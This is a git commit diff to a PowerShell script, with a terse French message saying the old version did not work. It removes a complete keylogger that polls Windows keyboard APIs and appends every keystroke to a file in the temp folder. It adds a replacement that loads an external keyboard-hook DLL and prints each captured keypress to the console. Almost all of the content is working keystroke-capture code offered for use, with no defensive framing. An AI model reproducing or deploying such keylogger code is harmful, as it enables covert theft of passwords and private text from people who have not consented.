53045ccb12f6247a2f58fea1ed5be891410a76f1
Elohyrr <118767910+Elohyrr@users.noreply.github.com>
2024-02-06 18:30:08 +0100

    ça marchais pas g mis un autre

--- script6.ps1
+++ script6.ps1
@@ -1,78 +1,48 @@
-#requires -Version 2
-function Start-KeyLogger($Path = "$env:temp\keylogger.txt") {
-    <#
-    .DESCRIPTION
-        By accessing the Windows low-level API functions, a script can constantly
-        monitor the keyboard for keypresses and log these to a file. This effectively produces a keylogger.
+Add-Type -TypeDefinition @"
+using System;
+using System.IO;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
 
-        Run the function Start-Keylogger to start logging key presses. Once you
-        stop the script by pressing CTRL+C, the collected key presses are displayed
+public static class Programme
+{
+    [DllImport("user32.dll")]
+    public static extern int MapVirtualKey(uint uCode, uint uMapType);
+}
 
-    .NOTES
-        http://powershell.com/cs/blogs/tips/archive/2015/12/09/creating-simple-keylogger.aspx
-    #>
-    # Signatures for API Calls
-    $signatures = @'
-[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
-public static extern short GetAsyncKeyState(int virtualKeyCode);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int GetKeyboardState(byte[] keystate);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int MapVirtualKey(uint uCode, int uMapType);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
-'@
+"@ -ReferencedAssemblies System.Windows.Forms
 
-    # load signatures and make members available
-    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
+# 0xBF >> french canadian: é | US Keyboard: ?
+#[char]([Programme]::MapVirtualKey(0xBF,2))
 
-    # create output file
-    $null = New-Item -Path $Path -ItemType File -Force
+Add-Type -Path '.\VISE_WinKeyboardHook.dll'
 
-    try {
-        Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red
-
-        # create endless loop. When user presses CTRL+C, finally-block
-        # executes and shows the collected key presses
-        while ($true) {
-            Start-Sleep -Milliseconds 40
-
-            # scan all ASCII codes above 8
-            for ($ascii = 9; $ascii -le 254; $ascii++) {
-                # get current key state
-                $state = $API::GetAsyncKeyState($ascii)
-
-                # is key pressed?
-                if ($state -eq -32767) {
-                    $null = [console]::CapsLock
-
-                    # translate scan code to real code
-                    $virtualKey = $API::MapVirtualKey($ascii, 3)
-
-                    # get keyboard state for virtual keys
-                    $kbstate = New-Object -TypeName Byte[] -ArgumentList 256
-                    $checkkbstate = $API::GetKeyboardState($kbstate)
-
-                    # prepare a StringBuilder to receive input key
-                    $mychar = New-Object -TypeName System.Text.StringBuilder
-
-                    # translate virtual key
-                    $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
-
-                    if ($success) {
-                        # add key to logger file
-                        [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
-                    }
-                }
-            }
+$KeyboardInterceptor = new-object VISE.WinKeyboardHook.KeyboardInterceptor
+function HandleKeyDown($keyId)
+{
+    if($keyID.KeyCode -eq "Escape"){
+        $KeyboardInterceptor.StopCapturing()
+        Write-Host "EXIT"
+    }else{
+        Write-Host "############################################"
+        try{
+            Write-Host "KeyChar   :" $([char]([Programme]::MapVirtualKey(("0x"+("    {0:x}" -f $keyID.KeyValue).ToUpper()),2)))
+        }catch{
+            Write-Host "KeyChar   : ERROR"
         }
-    }
-    finally {
-        # open logger file in Notepad
-        notepad $Path
+        Write-Host "KeyCode   :" $keyID.KeyCode
+        Write-Host "KeyData   :" $keyID.KeyData
+        Write-Host "KeyValue  : Dec=" $keyID.KeyValue 
+        Write-Host "            Hex=" ("{0:x}" -f $keyID.KeyValue).ToUpper()
+        Write-Host "Modifiers :" $keyID.Modifiers
+        Write-Host "Shift     :" $keyID.Shift
+        Write-Host "Alt       :" $keyID.Alt
+        Write-Host "Control   :" $keyID.Control
     }
 }
 
-# records all key presses until script is aborted by pressing CTRL+C
-# will then open the file with collected key codes
-#Start-KeyLogger
+Unregister-Event -SourceIdentifier KeyDown -ErrorAction SilentlyContinue
+$keyevent = Register-ObjectEvent -InputObject $KeyboardInterceptor -EventName     KeyDown -SourceIdentifier KeyDown -Action {HandleKeyDown($event.sourceEventArgs)}
+
+$KeyboardInterceptor.StartCapturing()
